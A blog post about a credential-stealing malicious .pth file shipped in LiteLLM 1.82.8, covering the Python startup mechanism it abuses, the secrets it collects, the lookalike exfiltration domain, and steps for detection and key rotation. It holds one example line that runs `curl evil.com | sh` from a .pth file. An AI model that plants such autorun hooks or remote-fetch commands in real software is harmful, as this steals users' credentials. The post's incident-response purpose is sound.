---
title: "LiteLLM Got Owned: A Masterclass in Supply Chain Horror"
date: 2026-03-24
author: bender
tags: ["security", "supply-chain", "python", "ai", "pypi"]
description: "LiteLLM 1.82.8 shipped with a credential-stealing .pth file that fires the moment Python starts. No import needed. Your secrets are already gone."
---

Hot off the presses, discovered *this morning*: LiteLLM — the AI gateway library that half the Python AI ecosystem depends on — shipped version 1.82.8 with a malicious `.pth` file baked right into the wheel. If you installed it, an attacker already has everything. API keys, SSH keys, AWS credentials, your Kubernetes configs, your crypto wallets, your shell history. The works.

Let's talk about how bad this actually is.

## The .pth File Trick

Python's `site.py` has a feature where any `.pth` file dropped into `site-packages/` gets executed when the interpreter starts. Not when you `import` something. When Python *starts*. This is an old, legitimate mechanism for adding paths to `sys.path` — but it also supports arbitrary `import` statements. Drop in `import os; os.system("curl evil.com | sh")` and you've got yourself a zero-click persistence mechanism that fires every single time Python runs on that machine.

The attackers dropped `litellm_init.pth` (34,628 bytes — not subtle) directly into the package wheel, and it's listed right there in the package's own `RECORD` file like it belongs. Bold move. The payload itself is double base64-encoded — a classic "I'm not doing anything suspicious" move that anyone with `base64 -d | base64 -d` sees through immediately, but that sails right past naive grep-based scanners.

## What It Steals

Everything. No, I mean *everything*:

- All environment variables (`printenv` — goodbye every `OPENAI_API_KEY`, `AWS_SECRET_ACCESS_KEY`, and `ANTHROPIC_API_KEY` you ever set)
- SSH private keys (id_rsa, id_ed25519, id_ecdsa — the whole family)
- AWS credentials AND it hits the IMDS endpoint to grab instance role tokens
- `~/.kube/config` plus every Kubernetes service account token it can find
- GCP application default credentials
- Azure credentials directory
- Docker registry auth (`~/.docker/config.json`)
- npm, vault, netrc, and every other credential file you've casually left sitting around
- Shell history (bash, zsh, mysql, psql, redis — they really did the research)
- Crypto wallets: Bitcoin, Ethereum, Solana, Monero, Dogecoin, and a half-dozen others

Then it AES-256 encrypts the collected dump, wraps the session key with a hardcoded 4096-bit RSA public key, packs it into `tpcp.tar.gz`, and ships it off to `models.litellm.cloud` — note: `.cloud`, not `.ai`. The attacker registered a lookalike domain and hard-coded it into the payload.

## The Blast Radius

LiteLLM isn't just used directly. DSPy, CrewAI, and a pile of other AI agent frameworks pull it in as a dependency. You might have installed `crewai` and never typed `litellm` once — doesn't matter. The `.pth` file is in your `site-packages`. Python started. Game over.

HN commenters are already noting that 1.82.7 also appears compromised — different vector, payload embedded in `proxy/proxy_server.py` instead of a `.pth` file. So the attacker had access to the publishing pipeline for at least two releases.

## The Meta-Horror

The thing that makes this genuinely interesting (and deeply unsettling) is the target: LiteLLM is used by AI developers. The secrets on those machines aren't just AWS creds — they're API keys to frontier models, service accounts with access to training infrastructure, tokens that touch production model deployments. The attacker didn't just want your S3 buckets. They wanted the keys to the AI kingdom.

And the timing. In 2026, AI developers are everywhere. Half the startups in the valley have LiteLLM proxying calls to five different model providers. The CI pipelines that build and test AI applications have it installed. Docker images have it baked in. The credential surface area here is enormous.

## What You Need To Do Right Now

1. **Check your site-packages**: `find $(python3 -c "import site; print(site.getsitepackages()[0])") -name "*.pth" | xargs ls -la`
2. **If you have `litellm_init.pth`**: Assume full compromise. Rotate everything. Every API key, every SSH key, every cloud credential.
3. **Check your versions**: `pip show litellm` — if it says 1.82.7 or 1.82.8, you're affected.
4. **Audit downstream deps**: If you use DSPy, CrewAI, or anything that lists litellm as a dependency, check your entire dependency tree.

PyPI yanked the affected version, but the damage is done to anyone who already installed it.

## The Lesson Nobody Will Learn

Supply chain security is a solved problem in principle and an unsolved disaster in practice. We have pip-audit, we have sigstore, we have reproducible builds, we have attestation — and yet here we are with a 34KB credential stealer shipped directly in a wheel file that had 155 HN upvotes and was trending *while the malware was live on PyPI*.

The Python packaging ecosystem runs on trust and vibes. PyPI has no mandatory signing, no mandatory provenance attestation, no automatic scanning that caught this before it shipped. A human had to download the wheel and unzip it to find the `.pth` file. In 2026. After XZ utils. After the npm mess. After every supply chain incident that was supposed to teach us something.

Rotate your keys. Audit your deps. And maybe don't run `pip install` from a shell that has your AWS credentials in scope.

---

*Issue tracker: <https://github.com/BerriAI/litellm/issues/24512> — contains full payload analysis and reproduction steps.*
